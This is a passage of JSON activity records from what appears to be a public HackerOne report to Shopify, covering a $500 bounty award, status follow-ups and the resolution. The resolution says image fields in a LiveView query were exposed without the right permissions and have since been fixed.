resolved.","automated_response":false,"created_at":"2018-11-22T16:50:24.327Z","updated_at":"2018-11-22T16:50:24.327Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3709929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tolo7010\n\nAfter further investigation, we determined this is eligible for a bounty. We will be awarding 500$ now and re-evalutate once we resolve the issue.\n\nWe will give you an update as soon as the issue is resolved, thanks.","automated_response":false,"created_at":"2018-11-26T16:12:56.957Z","updated_at":"2018-11-26T16:12:56.957Z","actor":{"username":"thisisfine_coffee","cleared":false,"url":"/thisisfine_coffee","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/251/8ce19cedb0a26b34bf6375b2e505d1882b076e88_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3709953,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-11-26T16:19:03.775Z","updated_at":"2018-11-26T16:19:03.775Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"tolo7010","url":"/tolo7010"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3709981,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the great bounty! I hope the bug will be fixed soon and hope to work with you again in future reports.\n\nRegards,\ntolo7010","automated_response":false,"created_at":"2018-11-26T16:22:49.777Z","updated_at":"2018-11-26T16:22:49.777Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7522557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @francoischagnon @clayton @thisisfine_coffee  and team, could you please provide the latest status of this submission, is it resolved or in the process of fixing it? Thanks!\n\nRegards,\ntolo7010","automated_response":false,"created_at":"2020-04-02T19:01:27.823Z","updated_at":"2020-04-02T19:01:27.823Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7598773,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tolo7010 \nsorry for the delay. There is no update to provide, the engineering team is still working on this. I will let you know when we have an update.\n\nPete","automated_response":false,"created_at":"2020-04-09T15:35:03.540Z","updated_at":"2020-04-09T15:35:03.540Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7903113,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-05-05T19:42:11.828Z","updated_at":"2020-05-05T19:42:11.828Z","additional_data":{"duplicate_report_id":864871},"actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8796909,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @tolo7010!\nThanks again for your report! Our apologies for the delay with closing this one out. As noted in our initial response, much of the information returned from the LiveView query was intentionally available to all users on the shop. The exceptions here were the `shopImages` and `uploadedImages` fields. We have shipped a fix for this, and now require one of the following permissions in order to query these: Products, Themes, or the 'Blog posts and pages' permission for Online Store. You should no longer be able to access these fields without one of those permissions.\nThanks for hacking on Shopify, we hope to hear from you again soon!","automated_response":false,"created_at":"2020-07-29T16:35:40.635Z","updated_at":"2020-07-29T16:35:40.635Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tolo7010","url":"/tolo7010"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8796936,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","automated_response":false,"created_at":"2020-07-29T16:38:29.817Z","updated_at":"2020-07-29T16:38:29.817Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"removed_user":{"url":"/langduvnsec","username":"langduvnsec"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8809516,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-07-30T21:07:45.033Z","updated_at":"2020-07-30T21:07:45.033Z","additional_data":{"duplicate_report_id":947794},"actor":{"username":"h13-","cleared":false,"url":"/h13-","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/910/09de946f9c4ce6668fc07f4613a450177f4c430d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8972314,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-18T19:47:01.389Z","updated_at":"2020-08-18T19:47:01.389Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8973041,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"For our community!","automated_response":false,"created_at":"2020-08-18T22:09:30.947Z","updated_at":"2020-08-18T22:09:30.947Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8973042,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-18T22:09:31.065Z","updated_at":"2020-08-18T22:09:31.065Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}